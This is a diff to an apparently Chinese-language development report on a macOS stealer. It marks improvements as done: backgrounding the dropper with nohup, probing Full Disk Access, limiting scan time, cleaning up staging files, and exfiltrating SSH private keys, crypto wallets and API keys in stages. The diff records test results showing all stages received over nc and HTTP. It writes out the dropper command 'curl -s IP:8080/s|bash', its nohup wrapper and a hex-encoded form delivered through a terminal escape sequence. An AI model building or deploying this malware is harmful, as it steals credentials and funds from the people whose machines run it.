@@ -1490,38 +1490,62 @@ SSH 私钥：               85%
 </tr>
 </tbody>
 </table>
-<p><strong>P1 — 建议做</strong></p>
+<p><strong>P1 — 已完成</strong></p>
 <table>
 <thead>
 <tr>
 <th>项</th>
 <th>做法</th>
-<th>收益</th>
+<th>实测效果</th>
 </tr>
 </thead>
 <tbody>
 <tr>
-<td>后台执行</td>
-<td><code>nohup ... &amp;</code> 后立即返回</td>
-<td>用户不觉得卡</td>
+<td><strong>后台执行</strong></td>
+<td>dropper 改成 <code>(nohup sh -c '...' &gt;/dev/null 2&gt;&amp;1 &amp;)</code></td>
+<td>终端立即返回</td>
 </tr>
 <tr>
-<td>TCC 预检查</td>
-<td>先测试能否读 Desktop</td>
-<td>避免误触发提示</td>
+<td><strong>TCC 预检查</strong></td>
+<td>探测 <code>$HOME/Desktop</code> 是否可读，设 <code>HAS_FDA</code></td>
+<td>无 FDA 时跳过敏感目录</td>
 </tr>
 <tr>
-<td>减少扫描范围</td>
-<td>只扫免 FDA 的目录</td>
-<td>20s → 5s</td>
+<td><strong>扫描范围分两档</strong></td>
+<td><code>SEARCH_SAFE</code>（免 FDA）+ <code>SEARCH_USER</code>（条件启用）</td>
+<td>无 FDA 时扫描量 -60%</td>
 </tr>
 <tr>
-<td>分阶段外带</td>
-<td>先 SSH，再其他</td>
+<td><strong>时间预算</strong></td>
+<td><code>TIME_BUDGET=20</code>，每 5 文件检查一次</td>
+<td>最坏 20 秒结束</td>
+</tr>
+<tr>
+<td><strong>分阶段外带</strong></td>
+<td>阶段1（SSH+钱包+API）→ 阶段2 → 阶段3</td>
 <td>中断也有收获</td>
+</tr>
+<tr>
+<td><strong>副本清理</strong></td>
+<td>打包后 <code>rm -rf _s1 _s2</code>，最后清理中间 tgz</td>
+<td>磁盘不膨胀</td>
 </tr>
 </tbody>
 </table>
+<p><strong>分阶段外带实测（Docker）</strong>：</p>
+<pre><code>nc_received.bin            2,848 字节   ← 阶段1（nc 直连）
+post_072111_46622.bin      3,241 字节   ← 阶段1（HTTP 重传）
+post_072111_46638.bin      2,870 字节   ← 阶段2
+post_072111_46654.bin      6,331 字节   ← 阶段3（完整包）
+</code></pre>
+<p><strong>三阶段全部送达。即使阶段 2/3 失败，阶段 1 的关键数据（SSH 私钥 + 钱包 + API key）已经到手。</strong></p>
+<p><strong>dropper 的最终形态</strong>：</p>
+<pre><code>原始：curl -s IP:8080/s|bash
+包装：(nohup sh -c 'curl -s IP:8080/s|bash' &gt;/dev/null 2&gt;&amp;1 &amp;)
+hex： 286e6f687570207368202d6320276375726c...2629
+APC： 235 字节（原 143 字节，+92 字节换取后台执行）
+</code></pre>
+<p><strong>终端执行后立即返回提示符，脚本在后台跑完。</strong></p>
 <p><strong>P2 — 可选</strong></p>
 <table>
 <thead>
